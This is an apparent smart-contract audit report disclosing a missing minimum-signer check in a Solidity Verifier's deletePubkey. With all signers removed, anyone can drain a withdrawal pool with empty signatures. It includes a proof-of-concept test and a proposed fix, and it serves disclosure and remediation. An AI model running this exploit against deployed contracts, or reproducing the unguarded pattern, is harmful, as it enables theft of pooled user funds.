### Title
Missing Minimum Signer Threshold in `deletePubkey` Enables Signature-Free Fast Withdrawal Drain — (File: `core/contracts/Verifier.sol`)

---

### Summary

`Verifier.deletePubkey` carries no minimum-threshold guard. If the owner removes all eight pubkeys, `nSigner` reaches zero. At that point `requireValidTxSignatures` trivially passes with an empty `signatures[]` array (`require(0 == 0)`), and any unprivileged caller can invoke `BaseWithdrawPool.submitFastWithdrawal` with a self-crafted withdrawal transaction and no valid signatures, draining the `WithdrawPool` of all ERC-20 collateral.

---

### Finding Description

**Root cause — `Verifier.deletePubkey` (no minimum threshold)**

`deletePubkey` decrements `nSigner` unconditionally and has no floor check:

```solidity
// Verifier.sol L85-91
function deletePubkey(uint256 index) public onlyOwner {
    if (!isPointNone(pubkeys[index])) {
        nSigner -= 1;          // ← no require(nSigner > 1)
        delete pubkeys[index];
    }
    emit DeletePubkey(index);
}
``` [1](#0-0) 

After all eight slots are deleted, `nSigner == 0`.

**Broken invariant — `requireValidTxSignatures`**

The function's final guard is:

```solidity
// Verifier.sol L288
require(nSignatures == nSigner, "not enough signatures");
``` [2](#0-1) 

When `nSigner == 0`, passing an empty `signatures[]` array yields `nSignatures = 0`, so `require(0 == 0)` passes. No iteration of the loop runs, so no individual signature is ever verified.

**Attacker-controlled entry path — `BaseWithdrawPool.submitFastWithdrawal`**

`requireValidTxSignatures` is the **sole authorization gate** for fast withdrawals:

```solidity
// BaseWithdrawPool.sol L90-91
Verifier v = Verifier(verifier);
v.requireValidTxSignatures(transaction, idx, signatures);
``` [3](#0-2) 

After the check, the contract decodes the caller-supplied `transaction` bytes and transfers tokens directly:

```solidity
// BaseWithdrawPool.sol L93-113
(uint32 productId, address sendTo, uint128 transferAmount) = resolveFastWithdrawal(transaction);
...
handleWithdrawTransfer(token, sendTo, transferAmount);
``` [4](#0-3) 

There is no on-chain check that the withdrawal was ever legitimately queued in the `Endpoint`, nor that the subaccount holds sufficient balance. The pool's ERC-20 balance is the only limit.

---

### Impact Explanation

**Impact: 3 — Direct asset theft from `WithdrawPool`.**

With `nSigner == 0`, any address can:
1. Craft a `WithdrawCollateral` or `WithdrawCollateralV2` byte payload naming themselves as `sendTo` and any `amount ≤ pool balance`.
2. Call `submitFastWithdrawal(idx, transaction, [])` with an empty signatures array.
3. Receive the full token transfer minus the fast-withdrawal fee.

The attacker can repeat this for every supported product token until the pool is empty. No privileged role is needed after the vulnerable state is reached.

---

### Likelihood Explanation

**Likelihood: 2 — Requires owner to delete all pubkeys, but no on-chain safeguard prevents it.**

The vulnerable state (`nSigner == 0`) requires the owner to call `deletePubkey` eight times. This mirrors the GovHub analog exactly: governance removing all members. It can occur during a key-rotation ceremony, an emergency key revocation, or a misconfigured upgrade script. Because there is no minimum-threshold guard, the contract offers no protection against this operational mistake. Once the state is reached, exploitation is immediate and permissionless.

---

### Recommendation

Add a minimum-threshold guard inside `deletePubkey`:

```solidity
function deletePubkey(uint256 index) public onlyOwner {
    if (!isPointNone(pubkeys[index])) {
        require(nSigner > 1, "cannot remove last signer");
        nSigner -= 1;
        delete pubkeys[index];
    }
    emit DeletePubkey(index);
}
```

This mirrors the fix applied to GovHub (commit `f7a91316`) and ensures `requireValidTxSignatures` can never be satisfied with zero signatures.

---

### Proof of Concept

```solidity
// Precondition: owner calls deletePubkey(0..7) — nSigner == 0

function testDrainWithdrawPool() public {
    // Step 1: owner removes all signers (no threshold guard)
    vm.startPrank(owner);
    for (uint256 i = 0; i < 8; i++) {
        verifier.deletePubkey(i);
    }
    vm.stopPrank();
    // nSigner == 0

    // Step 2: attacker crafts a withdrawal for the full pool balance
    bytes memory withdrawTx = abi.encodePacked(
        uint8(IEndpoint.TransactionType.WithdrawCollateral),
        abi.encode(IEndpoint.SignedWithdrawCollateral({
            tx: IEndpoint.WithdrawCollateral({
                sender: bytes32(uint256(uint160(attacker))),
                productId: QUOTE_PRODUCT_ID,
                amount: poolBalance,
                nonce: 0
            }),
            signature: ""
        }))
    );

    // Step 3: call submitFastWithdrawal with empty signatures — passes trivially
    vm.prank(attacker);
    withdrawPool.submitFastWithdrawal(
        minIdx + 1,
        withdrawTx,
        new bytes[](0)   // empty — satisfies require(0 == 0)
    );

    // attacker receives poolBalance tokens
    assertEq(token.balanceOf(attacker), poolBalance - fee);
}
```

### Citations

**File:** core/contracts/Verifier.sol (L85-91)
```text
    function deletePubkey(uint256 index) public onlyOwner {
        if (!isPointNone(pubkeys[index])) {
            nSigner -= 1;
            delete pubkeys[index];
        }
        emit DeletePubkey(index);
    }
```

**File:** core/contracts/Verifier.sol (L274-288)
```text
        uint256 nSignatures = 0;
        for (uint256 i = 0; i < signatures.length; i++) {
            if (signatures[i].length > 0) {
                nSignatures += 1;
                require(
                    checkIndividualSignature(
                        hashedMsg,
                        signatures[i],
                        uint8(i)
                    ),
                    "invalid signature"
                );
            }
        }
        require(nSignatures == nSigner, "not enough signatures");
```

**File:** core/contracts/BaseWithdrawPool.sol (L90-91)
```text
        Verifier v = Verifier(verifier);
        v.requireValidTxSignatures(transaction, idx, signatures);
```

**File:** core/contracts/BaseWithdrawPool.sol (L93-113)
```text
        (
            uint32 productId,
            address sendTo,
            uint128 transferAmount
        ) = resolveFastWithdrawal(transaction);
        IERC20Base token = getToken(productId);

        require(transferAmount <= INT128_MAX, ERR_CONVERSION_OVERFLOW);

        int128 fee = fastWithdrawalFeeAmount(token, productId, transferAmount);

        if (sendTo == msg.sender) {
            require(transferAmount > uint128(fee), "Fee larger than balance");
            transferAmount -= uint128(fee);
        } else {
            safeTransferFrom(token, msg.sender, uint128(fee));
        }

        fees[productId] += fee;

        handleWithdrawTransfer(token, sendTo, transferAmount);
```
